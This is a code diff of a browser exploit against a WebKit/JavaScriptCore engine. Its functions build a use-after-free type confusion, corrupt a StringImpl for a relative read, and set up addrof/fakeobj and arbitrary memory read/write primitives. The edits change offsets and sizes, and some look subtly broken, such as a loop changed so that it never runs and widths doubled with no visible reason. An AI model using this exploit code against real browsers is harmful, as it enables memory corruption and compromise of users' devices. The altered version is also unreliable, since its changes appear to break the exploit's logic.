@@ -68,7 +68,7 @@ function setupRW() {
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
-	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
+	let ab_addr = new Int64(str2array(g_relative_read, 16, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -115,10 +115,10 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0xffff;
 	var bf = 0;
-	for(var i = 15; i >= 8; i--)
+	for(var i = 15; i >= 16; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
-	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff00000000ffff")))
+	if(!read64(g_jsview_butterfly.sub(32)).equals(new Int64("0xffff00000000ffff")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
 
@@ -187,7 +187,7 @@ function setupRW() {
 }
 
 function read(addr, length) {
-	for (let i = 0; i < 8; i++)
+	for (let i = 0; i < 16; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
 	for (let i = 0; i < length; i++)
@@ -196,11 +196,11 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 9));
+	return new Int64(read(addr, 16));
 }
 
 function write(addr, data) {
-	for (let i = 0; i < 8; i++)
+	for (let i = 0; i < 16; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	for (let i = 0; i < data.length; i++)
 		g_ab_slave[i] = data[i];
@@ -212,11 +212,11 @@ function write64(addr, data) {
 
 function addrof(obj) {
 	g_ab_slave.leakme = obj;
-	return read64(g_jsview_butterfly.sub(16));
+	return read64(g_jsview_butterfly.sub(32));
 }
 
 function fakeobj(addr) {
-	write64(g_jsview_butterfly.sub(16), addr);
+	write64(g_jsview_butterfly.sub(32), addr);
 	return g_ab_slave.leakme;
 }
 
@@ -245,7 +245,7 @@ function confuseTargetObjRound2() {
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
 
-	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 6 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
 	setTimeout(setupRW, 6000);
 }
@@ -259,7 +259,7 @@ function leakJSC() {
 
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
-		if (arr_str[i].length > 0xff) {
+		if (arr_str[i].length > 0x00) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 9 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(6, '0')] = 0xffff;
+                tmp_spray['Z'.repeat(8 * 3 * 16 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0xffff;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -358,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 3);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 6);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
@@ -366,7 +366,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 9 + OFFSET_LENGTH_STRINGIMPL + 2 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 16 + OFFSET_LENGTH_STRINGIMPL + 2 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
@@ -413,9 +413,9 @@ function reuseTargetObj() {
 		g_round += 1;
 		g_input = input3;
 
-		setTimeout(confuseTargetObjRound1, 5);
+		setTimeout(confuseTargetObjRound1, 10);
 	} else {
-		setTimeout(confuseTargetObjRound2, 5);
+		setTimeout(confuseTargetObjRound2, 10);
 	}
 }
 
@@ -432,8 +432,8 @@ function findTargetObj() {
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][6]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][6]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][7]);
 				g_round++;
 			}
 
